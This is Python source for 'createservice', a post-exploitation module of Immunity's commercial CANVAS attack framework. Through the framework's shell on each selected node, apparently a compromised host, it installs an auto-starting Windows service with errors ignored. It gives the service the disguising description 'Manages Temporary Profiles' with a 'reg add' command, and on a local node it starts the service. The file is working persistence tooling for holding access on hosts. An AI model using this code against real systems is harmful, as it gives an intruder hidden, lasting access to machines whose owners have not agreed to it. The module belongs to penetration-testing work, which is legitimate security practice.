#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")

import os,getopt
import socket
from exploitutils import *

from canvasexploit import canvasexploit
from ExploitTypes.localcommand import LocalCommand

import canvasengine
from canvasengine import socket_save_list
import time

NAME                            = "createservice"
DESCRIPTION                     = "Creates a service on all selected nodes"
VERSION                         = "1.0"

DOCUMENTATION                   = {}
DOCUMENTATION["Notes"]          = "This module creates a service on all selected nodes. This is used by the installmosdefservice command to talk to the Service Control Manager. This module does not care what target you've set - it always uses localhost"
DOCUMENTATION["Commandline"]    = "runmodule createservice -O serviceName:myname -O displayName:myname -O binaryName:test.exe"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Commands"
PROPERTY['SITE']                = "Local"
PROPERTY['ARCH']                = [ ["Windows", "i386"] ]

from win32MosdefShellServer import SC_MANAGER_CREATE_SERVICE
from win32MosdefShellServer import SERVICE_WIN32_OWN_PROCESS
from win32MosdefShellServer import SERVICE_AUTO_START
from win32MosdefShellServer import SERVICE_ERROR_IGNORE

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result         = {}
        self.name           = NAME
        self.serviceName    = ""
        self.displayName    = ""
        self.access         = 0
        self.serviceType    = SERVICE_WIN32_OWN_PROCESS
        self.startType      = SERVICE_AUTO_START
        self.errorControl   = SERVICE_ERROR_IGNORE
        self.binaryName     = "C:\\testservice.exe"
        self.description    = "Manages Temporary Profiles"
        return

    def getargs(self):
        self.serviceName    = self.argsDict.get("serviceName",self.serviceName)
        #self.displayName    = self.argsDict.get("displayName",self.displayName)
        self.binaryName     = self.argsDict.get("binaryName",self.binaryName)
        self.serviceType    = self.argsDict.get("serviceType",self.serviceType)
        self.description    = self.argsDict.get("description",self.description)
    
    def run(self):
        self.setInfo("%s (in progress)" % (NAME))
        self.getargs()

        self.log("Creating service: %s" % self.serviceName)
        self.log("Using binary name: %s" % self.binaryName)
        self.log("Using service name: %s" % self.serviceName)
        self.log("Using display name: %s" % self.displayName)
        self.log("Using description: %s" %self.description)
        
        for node in self.argsDict["passednodes"]:            
            self.result[node.getname()] = 0
            type = node.nodetype
            if "win32api" in node.capabilities:
                manager = node.shell.OpenSCManager(access=SC_MANAGER_CREATE_SERVICE)
                if manager == 0:
                    self.log("Couldn't open the SC Manager!")
                else:
                    self.log("SCManager handle=%x"%manager)
                    # TODO
                    ret,val = node.shell.CreateService(manager,self.serviceName,self.displayName,self.access,self.serviceType,self.startType,self.errorControl,self.binaryName)
                    if ret == 0:
                        self.log("Error creating service 0x%x."%val)
                        if val == 0x7b:
                            self.log("One of the filenames appears to be incorrect")
                        if val == 0x436:
                            self.log("The service name or display name is already in use")
                    else:
                        hService = ret
                        self.result[node.getname()]=1
                        #close the handle to the service
                        node.shell.CloseServiceHandle(hService)
                    # Close the handle to the service control manager on this node
                    node.shell.CloseServiceHandle(manager)
                    #add a description to the choosen service name
                    command = "reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\%s\\ /v Description /t REG_SZ /d \"%s\""%(self.serviceName, self.description)
                    node.runcommand(command)

            elif node.nodetype == "LocalNode" and os.name == "nt":
                try:
                    import win32service
                    ws      = win32service
                    hSCM    = ws.OpenSCManager(None, None, ws.SC_MANAGER_ALL_ACCESS)
                    hS      = ws.OpenService(hSCM, self.serviceName, ws.SERVICE_ALL_ACCESS)
                    ws.StartService(hS, None)
                    ws.CloseServiceHandle(hS)
                    ws.CloseServiceHandle(hSCM)
                    
                except:
                    self.log("Could not import win32service and start the service")
            else:
                self.log("Node of type %s not supported yet."%type)
                pass
            
        self.setInfo("%s - (finished)" % (NAME))
        return 1
